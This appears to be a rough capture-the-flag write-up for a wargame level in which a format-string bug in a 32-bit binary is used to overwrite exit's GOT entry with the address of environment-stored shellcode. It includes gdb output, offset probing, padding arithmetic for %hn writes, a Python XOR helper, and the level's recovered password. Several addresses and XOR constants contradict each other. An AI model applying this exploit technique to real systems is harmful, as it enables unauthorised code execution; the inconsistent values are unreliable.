ok the program take a input of 100 
and after is the char is between  64 >  and <= 90
is xor with 32 


the goal is her is put the buffer of input directly to printf 
.text:08048500                 lea     eax, [esp+98h+buffer]
.text:08048504                 mov     [esp], eax
.text:08048507                 call    _printf


fo this reason is exploitable with arbitary adresse on any position any value


here i want to exploit the goat table of exit

and here is not security in stack and no canary
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level05/level05



the adres of the exit goat =>
(gdb) x/10i $eip
=> 0x8048370 <exit@plt>:	jmp    DWORD PTR ds:0x80497e0
   0x8048376 <exit@plt+6>:	push   0x18
   0x804837b <exit@plt+11>:	jmp    0x8048330



so the destination is 0x80497e0

and the shellcode is on env :

(gdb) x/10s *environ
0xffffd820:	 "LC_PAPER=de_CH.UTF-8"
0xffffd835:	 "LC_ADDRESS=de_CH.UTF-8"
0xffffd84c:	 "LC_MONETARY=de_CH.UTF-8"



the i put my paylaod in env with addres 
export SHELLCODE=""

and found =>
0xffffd859:	 "SHELLCODE="


because aslr is disable is every launch the same adress 


for the problem i just write a function to xore with 30 element before if in condition  64 >  and <= 90 

because xore juste revert to the original after so perfect 



just i need to two witch argument is exploitable:

but because A switch to the value 9 i put the value =9 directly




def xore(data):
    for i in range(len(data)):
        if data[i] > 64 and data[i] <= 90:
            data[i] ^= 30
    return data



    evel05@OverRide:~$ echo "aaaa%x %x %x %x %x %x %x %x %x %x %x %x %x %x" | ./level05
aaaa64 f7fcfac0 f7ec3b11 ffffd5ef ffffd5ee 0 ffffffff ffffd674 f7fdb000 61616161 25207825 78252078 20782520 25207825


so is the 10 th element is exploitable


so i juste need to put %10$n and puth the correct offset inside


dest =  0x80497e0 got table
value = 0xffffd859 env element

10 element


(gdb) p/d 0xffffd859
$2 = 4294957145


but the problem is that the 4294957145 is to big because MAX_INT is 2147483647 is really two big 

so the solution is to print in two part one part %hn


and h is short so only 2 octet 


so the first part is 




calculate the value of padding 0xffffd7c9:

gef➤  p/d 0xd7c9
55241


so the first value is 55385
with substract 8 because is already print with 2x
55241 - 8 = 55233 frist value


second value is same 

gef➤  p/d 0xffff
$3 = 65535

and same element you need to substract already print 65535-55241 = 10294




## Calculation with 0xffffd85a + 30

Final address: 0xffffd85a + 30 (0x1e) = 0xffffd878

Calculate the padding value 0xffffd878:

gef➤  p/d 0xd878
55416

So the first value is 55416
with subtraction of 8 because already printed with 2x
55416 - 8 = 55408 (first value)

Second value (same principle):

gef➤  p/d 0xffff
$3 = 65535

And subtract what has already been printed: 65535 - 55416 = 10119 (second value)


export SHELLCODE=$(cat /tmp/shellcode)

(cat /tmp/payload; cat -) | ./level05 


cat /home/users/level06/.pass
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq

